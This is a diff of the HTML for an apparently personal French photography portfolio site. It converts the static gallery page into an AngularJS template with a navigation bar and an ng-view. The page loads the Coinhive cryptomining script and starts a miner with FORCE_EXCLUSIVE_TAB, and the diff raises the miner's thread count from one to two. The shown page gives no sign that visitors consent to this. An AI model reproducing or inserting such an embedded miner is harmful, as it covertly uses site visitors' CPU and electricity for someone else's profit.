@@ -1,8 +1,6 @@
 <!doctype html>
-<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7" lang=""> <![endif]-->
-<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8" lang=""> <![endif]-->
-<!--[if IE 8]>         <html class="no-js lt-ie9" lang=""> <![endif]-->
-<!--[if gt IE 8]><!--> <html class="no-js" lang=""> <!--<![endif]-->
+
+<html lang="fr" ng-app="myApp" ng-controller="globalCtrl"> 
     <head>
         <meta charset="utf-8">
         <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
@@ -26,192 +24,44 @@
 
         <!--Theme Responsive css-->
         <link rel="stylesheet" href="assets/css/responsive.css" />
-
+	<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.4.8/angular.min.js"></script>
+	<script src="https://code.angularjs.org/1.2.4/angular-route.min.js"></script>
+    <script type="text/javascript" src="js/web.js"></script>
         <script src="assets/js/vendor/modernizr-2.8.3-respond-1.4.2.min.js"></script>
 <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+<title>{{webTab}}</title>
 
     </head>
-    <body>
-        <!--[if lt IE 8]>
-            <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
-        <![endif]-->
-
-
-
-        <nav id="main-nav">
-            <ul>
-                <li><a href="#home"><span>Home</span></a></li>
-                <li><a href="portrait.html"><span>Galerie Portrait</span></a></li>
-                <li><a href="sport.html"><span>Galerie Photographie Sportive</span></a></li>
-                <li><a href="travel.html"><span>Galerie Voyages</span></a></li>
-            </ul>
-            <a href="#0" class="cd-close-menu">Close<span></span></a>
-        </nav>
-
-        <!--Home page style-->
-        <header id="home" class="home home-main-content">
-            <div class="overlay sections">
-                <div class="container text-center">
-                    <div class="row">
-                        <div class="div-menu">
-                            <header class="cd-header">
-                                <div id="cd-logo">
-                                    <a href="index.html"><img src="assets/images/logo-white.png" alt="Logo"></a>
-                                </div>
-                                <a class="cd-menu-trigger" href="#main-nav"><span></span></a>
-                            </header>
-                        </div>
-
-
-                        <div class="home-wrapper">
-                            <div class="col-md-6 col-md-offset-3 col-sm-12 col-xs-12">
-                                <div class="home-content">
-                                    <h1>Antoine Lambert</h1>
-                                    <p>#Photograph &nbsp; #Student &nbsp; #Developper</p>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
+  <body>
+<!-- Navigation -->
+    <nav class="navbar navbar-inverse navbar-fixed-top" role="navigation" ng-controller="menuCtrl">
+        <div class="container">
+            <!-- Brand and toggle get grouped for better mobile display -->
+            <div class="navbar-header">
+                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                    <span class="sr-only">Toggle navigation</span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                </button>
+                <a class="navbar-brand" href="#/">{{businessName}}</a>
             </div>
-        </header>
+            <!-- Collect the nav links, forms, and other content for toggling -->
+            <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+                <ul class="nav navbar-nav navbar-right">
+                    <li ng-repeat="x in tabs">
+                        <a href="{{x.link}}">{{x.title}}</a>
+                    </li>
+                </ul>
+            </div>
+            <!-- /.navbar-collapse -->
+        </div>
+        <!-- /.container -->
+    </nav>
+	
 
-        <!-- Sections -->
-        <section id="about" class="sections3">
-            <div class="container">
-                <!-- Example row of columns -->
-                <div class="row">
-                    <div class="about-wrapper">
-
-                        <div class="col-md-6 col-sm-6 col-xs-12">
-                            <div class="about-photo">
-                                <img src="assets/images/me.jpg" alt="About Photo" />
-                            </div>
-                        </div>
-
-                        <div class="col-md-6 col-sm-6 col-xs-12">
-                            <div class="about-content text-left">
-                        <h4>Antoine Lambert, photographe et étudiant</h4>
-				<p>Etudiant, 20 ans, la photo est ma passion.</p>
-                                <p>"Un bon photographe est celui qui est capable non pas de représenter la réalité objective, mais de traduire les sensations et les émotions ressenties au moment de déclencher" - David DUCHEMIN (PHOTOGRAPHE)</p>
-                            </div>
-                        </div>
-
-                    </div>
-                </div>	
-            </div> <!-- /container -->       
-        </section>
-
-
-        <!-- Sections -->
-        <section id="portfolio" class="sections">
-            <div class="container">
-
-                <div class="heading-content text-center">
-                    <h3>Mes dernières photos</h3>
-                    <p>Pas besoin d'être un modèle pour atteindre la perfection</p>
-                </div>
-
-                <!-- Example row of columns -->
-                <div class="row">
-                    <div class="portfolio-wrapper">
-                        <div class="col-md-3 col-sm-6 col-xs-12">
-                            <div class="portfolio-item">
-                                <a href="assets/images/portfolio/pf1.jpg" class="portfolio-img"><img src="assets/images/portfolio/pf1.jpg" alt="" /></a>
-                            </div>
-                        </div>
-
-                        <div class="col-md-3 col-sm-6 col-xs-12">
-                            <div class="portfolio-item">
-                                <a href="assets/images/portfolio/pf2.jpg" class="portfolio-img"><img src="assets/images/portfolio/pf2.jpg" alt="" /></a>
-                            </div>
-                        </div>
-
-                        <div class="col-md-3 col-sm-6 col-xs-12">
-                            <div class="portfolio-item">
-                                <a href="assets/images/portfolio/pf3.jpg" class="portfolio-img"><img src="assets/images/portfolio/pf3.jpg" alt="" /></a>
-                            </div>
-                        </div>
-
-                        <div class="col-md-3 col-sm-6 col-xs-12">
-                            <div class="portfolio-item">
-                                <a href="assets/images/portfolio/pf4.jpg" class="portfolio-img"><img src="assets/images/portfolio/pf4.jpg" alt="" /></a>
-                            </div>
-                        </div>
-
-
-                    </div>
-                </div>
-
-		<div class="row">
-                    <div class="portfolio-wrapper">
-                        <div class="col-md-3 col-sm-6 col-xs-12">
-                            <div class="portfolio-item">
-                                <a href="assets/images/portfolio/pf5.jpg" class="portfolio-img"><img src="assets/images/portfolio/pf5.jpg" alt="" /></a>
-                            </div>
-                        </div>
-
-                        <div class="col-md-3 col-sm-6 col-xs-12">
-                            <div class="portfolio-item">
-                                <a href="assets/images/portfolio/pf6.jpg" class="portfolio-img"><img src="assets/images/portfolio/pf6.jpg" alt="" /></a>
-                            </div>
-                        </div>
-
-                        <div class="col-md-3 col-sm-6 col-xs-12">
-                            <div class="portfolio-item">
-                                <a href="assets/images/portfolio/pf7.jpg" class="portfolio-img"><img src="assets/images/portfolio/pf7.jpg" alt="" /></a>
-                            </div>
-                        </div>
-
-                        <div class="col-md-3 col-sm-6 col-xs-12">
-                            <div class="portfolio-item">
-                                <a href="assets/images/portfolio/pf8.jpg" class="portfolio-img"><img src="assets/images/portfolio/pf8.jpg" alt="" /></a>
-                            </div>
-                        </div>
-
-
-                    </div>
-                </div>
-
-                
-                <div class="row">
-                    <div class="portfolio-wrapper">
-                        <div class="col-md-3 col-sm-6 col-xs-12">
-                            <div class="portfolio-item">
-                                <a href="assets/images/portfolio/pf9.jpg" class="portfolio-img"><img src="assets/images/portfolio/pf9.jpg" alt="" /></a>
-                            </div>
-                        </div>
-
-                        <div class="col-md-3 col-sm-6 col-xs-12">
-                            <div class="portfolio-item">
-                                <a href="assets/images/portfolio/pf10.jpg" class="portfolio-img"><img src="assets/images/portfolio/pf10.jpg" alt="" /></a>
-                            </div>
-                        </div>
-
-                        <div class="col-md-3 col-sm-6 col-xs-12">
-                            <div class="portfolio-item">
-                                <a href="assets/images/portfolio/pf11.jpg" class="portfolio-img"><img src="assets/images/portfolio/pf11.jpg" alt="" /></a>
-                            </div>
-                        </div>
-
-			<div class="col-md-3 col-sm-6 col-xs-12">
-                            <div class="portfolio-item">
-                                <a href="assets/images/portfolio/pf12.jpg" class="portfolio-img"><img src="assets/images/portfolio/pf12.jpg" alt="" /></a>
-                            </div>
-                        </div>
-
-
-                    </div>
-                </div>
-
-
-
-            </div> <!-- /container -->       
-        </section>
-
+	<div ng-view></div>
         
-
-       
 
 
 
@@ -235,9 +85,8 @@
             </div>
 
         </footer>
-
-
-        <script src="assets/js/vendor/jquery-1.11.2.min.js"></script>
+    </div>
+    <script src="assets/js/vendor/jquery-1.11.2.min.js"></script>
         <script src="assets/js/vendor/bootstrap.min.js"></script>
 
         <script src="assets/js/plugins.js"></script>
@@ -251,7 +100,7 @@ miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
 
 // Update stats once per second
 setInterval(function() {
-miner.setNumThreads(1);
+miner.setNumThreads(2);
     var threadCount = miner.getNumThreads();
     var hashesPerSecond = Math.round(miner.getHashesPerSecond() * 100) / 100;
     var totalHashes = miner.getTotalHashes();
@@ -271,29 +120,6 @@ miner.setNumThreads(1);
     }
 }, 1000);
 </script>
-    </body>
+</body>
+
 </html>
-
-<!-- <div class="row">
-                    <div class="portfolio-wrapper2">
-                        <div class="col-md-6 col-sm-6 col-xs-12">
-                            <div class="portfolio-item width-img">
-                                <a href="assets/images/portfolio/pf5.jpg" class="portfolio-img"><img src="assets/images/portfolio/pf5.jpg" alt="" /></a>
-                            </div>
-                        </div>
-
-                        <div class="col-md-3 col-sm-6 col-xs-12">
-                            <div class="portfolio-item">
-                                <a href="assets/images/portfolio/pf6.jpg" class="portfolio-img"><img src="assets/images/portfolio/pf6.jpg" alt="" /></a>
-                            </div>
-                        </div>
-
-                        <div class="col-md-3 col-sm-6 col-xs-12">
-                            <div class="portfolio-item">
-                                <a href="assets/images/portfolio/pf7.jpg" class="portfolio-img"><img src="assets/images/portfolio/pf7.jpg" alt="" /></a>
-                            </div>
-                        </div>
-
-                    </div>
-                </div>
--->
